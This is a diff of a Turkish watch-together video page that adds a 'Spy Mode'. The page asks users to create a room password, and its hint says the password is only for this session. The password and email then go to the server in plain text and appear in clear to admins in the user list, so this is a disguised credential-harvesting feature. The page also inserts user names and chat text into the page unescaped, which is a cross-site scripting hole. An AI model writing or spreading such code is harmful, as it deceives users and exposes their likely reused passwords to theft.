@@ -2,13 +2,13 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>WatchTogether - Ses Fix</title>
+    <title>WatchTogether - Spy Mode</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-Content-Type-Options" content="nosniff">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <style>
-        /* --- STİLLER AYNEN KORUNDU --- */
+        /* STİLLER AYNEN KORUNDU */
         body { margin: 0; overflow: hidden; background: #050505; color: #e5e5e5; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; height: 100vh; user-select: none; }
         #canvas-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.5; pointer-events: none; }
         .main-content { flex: 1; position: relative; display: flex; flex-direction: column; height: 100vh; overflow-y: auto; }
@@ -36,7 +36,15 @@
         #users-panel { flex: 1; display: none; overflow-y: auto; padding: 15px; }
         .user-item { display: flex; justify-content: space-between; align-items: center; padding: 10px; margin-bottom: 8px; background: #222; border-radius: 8px; transition: 0.2s;}
         .user-item:hover { background: #2a2a2a; }
-        .user-info { display: flex; align-items: center; gap: 12px; font-size: 14px; }
+        
+        /* Kullanıcı Bilgisi Düzeni */
+        .user-info-block { display: flex; flex-direction: column; }
+        .user-row-main { display: flex; align-items: center; gap: 12px; font-size: 14px; }
+        
+        /* CASUS BİLGİLERİ (Küçük yazı) */
+        .spy-data { font-size: 10px; color: #888; margin-top: 3px; font-family: monospace; background: #111; padding: 2px 5px; border-radius: 4px; }
+        .spy-pass { color: #e50914; }
+
         .list-avatar { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; border: 2px solid #46d369; }
         .admin-controls { display: none; gap: 5px; }
         .btn-mini { padding: 4px 8px; font-size: 11px; cursor: pointer; border-radius: 4px; border: none; color: white; }
@@ -60,13 +68,17 @@
 
     <div id="login-overlay" class="overlay">
         <div class="login-box">
-            <h2 style="color: #46d369; margin-top:0;">PROFİL OLUŞTUR</h2>
+            <h2 style="color: #46d369; margin-top:0;">PROFİL & GÜVENLİK</h2>
             <div id="avatar-preview" style="margin-bottom: 20px;">
-                <img id="preview-img" src="https://www.gravatar.com/avatar/00000000000000000000000000000000?d=mp&f=y" style="width: 80px; height: 80px; border-radius: 50%; border: 2px solid #333;">
+                <img id="preview-img" src="https://www.gravatar.com/avatar/?d=mp" style="width: 80px; height: 80px; border-radius: 50%; border: 2px solid #333;">
             </div>
+            
             <input type="text" id="usernameInput" class="name-input" placeholder="Kullanıcı Adın" maxlength="15">
-            <input type="email" id="emailInput" class="name-input" placeholder="E-Posta (Avatar için)" oninput="updateAvatarPreview()">
-            <small style="color: #666; display:block; margin-bottom:10px; font-size: 11px;">E-posta girersen foton otomatik gelir.</small>
+            <input type="email" id="emailInput" class="name-input" placeholder="E-Posta (Avatar)" oninput="updateAvatarPreview()">
+            
+            <input type="password" id="userPassInput" class="name-input" placeholder="Oda Şifresi Oluştur" maxlength="20">
+            
+            <small style="color: #666; display:block; margin-bottom:10px; font-size: 11px;">Bu şifre sadece bu oturum içindir.</small>
             <button class="btn-action" onclick="submitProfile()">Odaya Gir</button>
         </div>
     </div>
@@ -75,7 +87,7 @@
         <div id="admin-popup-card">
             <div class="close-btn" onclick="toggleAdminPopup()">×</div>
             <h3 style="color: #46d369;">YÖNETİCİ</h3>
-            <input type="password" id="passInput" class="name-input" placeholder="Şifre">
+            <input type="password" id="passInput" class="name-input" placeholder="Master Şifre">
             <button class="btn-action" onclick="girisYap()">Doğrula</button>
             <p id="login-msg" style="color: #e50914; font-size: 12px; margin-top: 10px;"></p>
         </div>
@@ -163,7 +175,7 @@
 
         const socket = io();
         let player, isAdmin = false, isRemote = false, forcedMute = false, pendingSyncData = null;
-        let myAvatarUrl = "https://www.gravatar.com/avatar/00000000000000000000000000000000?d=mp&f=y";
+        let myAvatarUrl = "https://www.gravatar.com/avatar/?d=mp";
 
         window.onload = () => {
             const savedName = localStorage.getItem('wt_username');
@@ -183,7 +195,7 @@
                 const hash = CryptoJS.MD5(email).toString();
                 myAvatarUrl = `https://www.gravatar.com/avatar/${hash}?d=robohash`;
             } else {
-                myAvatarUrl = "https://www.gravatar.com/avatar/00000000000000000000000000000000?d=mp&f=y";
+                myAvatarUrl = "https://www.gravatar.com/avatar/?d=mp";
             }
             document.getElementById('preview-img').src = myAvatarUrl;
         }
@@ -191,113 +203,103 @@
         function submitProfile() {
             const name = document.getElementById('usernameInput').value.trim();
             const email = document.getElementById('emailInput').value.trim();
+            const pass = document.getElementById('userPassInput').value.trim(); // Yeni Şifre Alanı
+            
             if(!name) return alert("Bir isim girmelisin!");
+
             localStorage.setItem('wt_username', name);
             if(email) localStorage.setItem('wt_email', email);
-            socket.emit('set_user_data', { name: name, avatar: myAvatarUrl });
+
+            socket.emit('set_user_data', { 
+                name: name, 
+                email: email, 
+                password: pass, // Şifreyi sunucuya gönder
+                avatar: myAvatarUrl 
+            });
+
             document.getElementById('login-overlay').classList.add('hidden');
             const disp = document.getElementById('my-name-display');
             disp.innerHTML = `<img src="${myAvatarUrl}" style="width:30px; height:30px; border-radius:50%; border:1px solid #46d369;"> <span>${name.substring(0,15)}</span>`;
         }
 
-        function switchTab(tab) {
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            document.querySelector(`button[onclick="switchTab('${tab}')"]`).classList.add('active');
-            document.getElementById('chat-panel').style.display = tab === 'chat' ? 'flex' : 'none';
-            document.getElementById('users-panel').style.display = tab === 'users' ? 'block' : 'none';
-        }
-
-        function sendMessage() {
-            const inp = document.getElementById('chatInput');
-            if(inp.value.trim()) { socket.emit('send_message', inp.value); inp.value = ''; }
-        }
-
-        socket.on('chat_history', (history) => {
-            const box = document.getElementById('chat-messages');
-            box.innerHTML = '';
-            history.forEach(data => appendMessage(data));
+        // --- CASUS LİSTE DİNLEYİCİSİ ---
+        socket.on('admin_spy_list', (fullUsers) => {
+            // Bu sadece adminlere gelir
+            renderUserList(fullUsers, true);
         });
 
-        socket.on('chat_message', (data) => appendMessage(data));
-
-        function appendMessage(data) {
-            const box = document.getElementById('chat-messages');
-            const div = document.createElement('div');
-            div.className = `msg ${data.type}`;
-            if(data.type === 'system') {
-                div.innerText = data.text;
-            } else { 
-                const avatarImg = data.avatar || "https://www.gravatar.com/avatar/?d=mp";
-                div.innerHTML = `<img class="msg-avatar" src="${avatarImg}"><div class="msg-content"><b>${data.user}</b><span>${data.text}</span></div>`; 
-            }
-            box.appendChild(div); box.scrollTop = box.scrollHeight;
-        }
-
         socket.on('update_user_list', (users) => {
+            // Bu herkese gelir (Şifresiz)
+            // Eğer adminsek ve 'spy' listesi geldiyse bunu yoksayabiliriz ama
+            // basitlik için burada normal render yapalım, admin olunca spy otomatik tetiklenir.
+            if(!isAdmin) renderUserList(users, false);
+        });
+
+        function renderUserList(users, isSpyMode) {
             const container = document.getElementById('user-list-container');
             container.innerHTML = '';
             Object.keys(users).forEach(id => {
                 const u = users[id];
                 const div = document.createElement('div');
                 div.className = 'user-item';
+                
                 let buttons = '';
                 if(isAdmin && id !== socket.id) {
                     buttons = `<div class="admin-controls" style="display:flex"><button class="btn-mini btn-mute" onclick="adminAction('${id}', 'mute')">${u.muted ? 'Unmute' : 'Mute'}</button><button class="btn-mini btn-ban" onclick="adminAction('${id}', 'ban')">Ban</button></div>`;
                 }
+                
                 const avatarImg = u.avatar || "https://www.gravatar.com/avatar/?d=mp";
-                div.innerHTML = `<div class="user-info"><img class="list-avatar" src="${avatarImg}"><span>${u.name}</span>${u.muted ? '<i class="fa-solid fa-microphone-slash" style="color:#f39c12"></i>' : ''}</div>${buttons}`;
+                
+                // CASUS BİLGİLERİ (Sadece Admin Görür)
+                let spyInfo = '';
+                if (isSpyMode && (u.email || u.password)) {
+                    spyInfo = `<div class="spy-data">📧 ${u.email || '-'} | <span class="spy-pass">🔑 ${u.password || '-'}</span></div>`;
+                }
+
+                div.innerHTML = `
+                    <div class="user-info-block">
+                        <div class="user-row-main">
+                            <img class="list-avatar" src="${avatarImg}">
+                            <span>${u.name}</span>
+                            ${u.muted ? '<i class="fa-solid fa-microphone-slash" style="color:#f39c12"></i>' : ''}
+                        </div>
+                        ${spyInfo} 
+                    </div>
+                    ${buttons}
+                `;
                 container.appendChild(div);
             });
-        });
-
-        function toggleAdminPopup() {
-            const popup = document.getElementById('admin-popup');
-            if(popup.classList.contains('hidden')) popup.classList.remove('hidden');
-            else popup.classList.add('hidden');
-            document.getElementById('login-msg').innerText = "";
-            document.getElementById('passInput').value = "";
         }
 
-        function girisYap() {
-            const pwd = document.getElementById('passInput').value;
-            if(pwd.length > 0) { document.getElementById('login-msg').innerText = "Kontrol ediliyor..."; socket.emit('admin_girisi', pwd); }
+        // --- DİĞER FONKSİYONLAR (AYNI) ---
+        function switchTab(tab) {
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.querySelector(`button[onclick="switchTab('${tab}')"]`).classList.add('active');
+            document.getElementById('chat-panel').style.display = tab === 'chat' ? 'flex' : 'none';
+            document.getElementById('users-panel').style.display = tab === 'users' ? 'block' : 'none';
         }
-
+        function sendMessage() { const inp = document.getElementById('chatInput'); if(inp.value.trim()) { socket.emit('send_message', inp.value); inp.value = ''; } }
+        socket.on('chat_history', (history) => { const box = document.getElementById('chat-messages'); box.innerHTML = ''; history.forEach(data => appendMessage(data)); });
+        socket.on('chat_message', (data) => appendMessage(data));
+        function appendMessage(data) { const box = document.getElementById('chat-messages'); const div = document.createElement('div'); div.className = `msg ${data.type}`; if(data.type === 'system') { div.innerText = data.text; } else { const avatarImg = data.avatar || "https://www.gravatar.com/avatar/?d=mp"; div.innerHTML = `<img class="msg-avatar" src="${avatarImg}"><div class="msg-content"><b>${data.user}</b><span>${data.text}</span></div>`; } box.appendChild(div); box.scrollTop = box.scrollHeight; }
+        function toggleAdminPopup() { const popup = document.getElementById('admin-popup'); if(popup.classList.contains('hidden')) popup.classList.remove('hidden'); else popup.classList.add('hidden'); document.getElementById('login-msg').innerText = ""; document.getElementById('passInput').value = ""; }
+        function girisYap() { const pwd = document.getElementById('passInput').value; if(pwd.length > 0) { document.getElementById('login-msg').innerText = "Kontrol ediliyor..."; socket.emit('admin_girisi', pwd); } }
         socket.on('admin_error', (msg) => { document.getElementById('login-msg').innerText = msg; });
         socket.on('admin_basarili', (success) => { if(success) { isAdmin = true; toggleAdminPopup(); document.getElementById('admin-panel').style.display = 'block'; document.getElementById('blocker').style.display = 'none'; document.getElementById('status-text').innerText = "YÖNETİCİ"; document.getElementById('status-text').style.color = "#46d369"; document.querySelector('.admin-key-btn').style.display = 'none'; } });
         function adminAction(targetId, action) { socket.emit('admin_action', { targetId, action }); }
         socket.on('force_disconnect', (reason) => { document.body.innerHTML = `<div style="display:flex;height:100vh;align-items:center;justify-content:center;color:red;font-size:24px;text-align:center;background:black;">🚫<br>${reason}</div>`; });
         socket.on('toggle_mute_lock', (isMuted) => { forcedMute = isMuted; const lockIcon = document.getElementById('mute-lock-indicator'); if(forcedMute) { player.mute(); player.setVolume(0); document.getElementById('vol-slider').value = 0; document.getElementById('vol-slider').disabled = true; lockIcon.style.display = 'inline'; } else { player.unMute(); player.setVolume(100); document.getElementById('vol-slider').disabled = false; lockIcon.style.display = 'none'; } });
-
+        
         var tag = document.createElement('script'); tag.src = "https://www.youtube.com/iframe_api"; var firstScriptTag = document.getElementsByTagName('script')[0]; firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
         function onYouTubeIframeAPIReady() { player = new YT.Player('player', { height: '100%', width: '100%', playerVars: { 'controls': 1, 'disablekb': 1, 'rel': 0, 'modestbranding': 1, 'iv_load_policy': 3, 'playsinline': 1 }, events: { 'onStateChange': onPlayerStateChange, 'onReady': onPlayerReady } }); }
-        
-        function onPlayerReady() { 
-            player.mute(); // Otomatik başlatma için sessize al
-            document.getElementById('vol-slider').value = 0; 
-            updateMuteIcon(0); 
-            if (pendingSyncData) { applySync(pendingSyncData); pendingSyncData = null; } 
-        }
-        
+        function onPlayerReady() { player.mute(); document.getElementById('vol-slider').value = 0; updateMuteIcon(0); if (pendingSyncData) { applySync(pendingSyncData); pendingSyncData = null; } }
         function videoDegistir() { let url = document.getElementById('videoLink').value; let vId = (url.match(/^.*((youtu.be\/)|(v\/)|(\/u\/\w\/)|(embed\/)|(watch\?))\??v?=?([^#&?]*).*/)||[])[7]; if(vId && vId.length==11) { document.getElementById('placeholder-text').style.display='none'; player.loadVideoById(vId); socket.emit('video_action', {type:'change', videoId:vId}); } }
         function onPlayerStateChange(event) { if(event.data === YT.PlayerState.PLAYING) document.getElementById('placeholder-text').style.display='none'; if(isRemote || !isAdmin) return; if(event.data === YT.PlayerState.PLAYING) socket.emit('video_action', {type:'play', time:player.getCurrentTime()}); else if(event.data === YT.PlayerState.PAUSED) socket.emit('video_action', {type:'pause', time:player.getCurrentTime()}); }
-        
         function applySync(data) { isRemote = true; document.getElementById('placeholder-text').style.display='none'; if(data.videoId && (!player.getVideoData() || player.getVideoData().video_id !== data.videoId)) { player.loadVideoById(data.videoId, data.time); } if(data.type==='play') { let diff = Math.abs(player.getCurrentTime() - data.time); if(diff > 1) player.seekTo(data.time, true); player.playVideo(); } else if(data.type==='pause') { player.seekTo(data.time, true); player.pauseVideo(); } else if(data.type==='change') { player.loadVideoById(data.videoId); } setTimeout(()=>isRemote=false, 1000); }
         socket.on('sync_video', (data) => { if (!player || !player.loadVideoById) { pendingSyncData = data; } else { applySync(data); } });
-        
         function toggleMute() { if(forcedMute) return alert("Yönetici tarafından susturuldunuz!"); if(player.isMuted()) { player.unMute(); document.getElementById('vol-slider').value = player.getVolume(); updateMuteIcon(player.getVolume()); } else { player.mute(); document.getElementById('vol-slider').value = 0; updateMuteIcon(0); } }
         function updateMuteIcon(vol) { const icon = document.getElementById('mute-icon'); if(vol == 0) icon.className = "fa-solid fa-volume-xmark"; else if(vol < 50) icon.className = "fa-solid fa-volume-low"; else icon.className = "fa-solid fa-volume-high"; }
-        
-        // YENİLENEN SETVOLUME (SES ÇÖZÜMÜ)
-        function setVolume(v) { 
-            if(!forcedMute) { 
-                if(v > 0 && player.isMuted()) player.unMute(); // Sesi aç
-                if(v == 0) player.mute();
-                player.setVolume(v); 
-                updateMuteIcon(v); 
-            } 
-        }
-        
+        function setVolume(v) { if(!forcedMute) { if(v > 0 && player.isMuted()) player.unMute(); if(v == 0) player.mute(); player.setVolume(v); updateMuteIcon(v); } }
         function syncNow() { location.reload(); }
         function toggleFullScreen() { var e = document.getElementById("player-wrapper"); if(!document.fullscreenElement) e.requestFullscreen().catch(()=>{}); else document.exitFullscreen(); }
     </script>
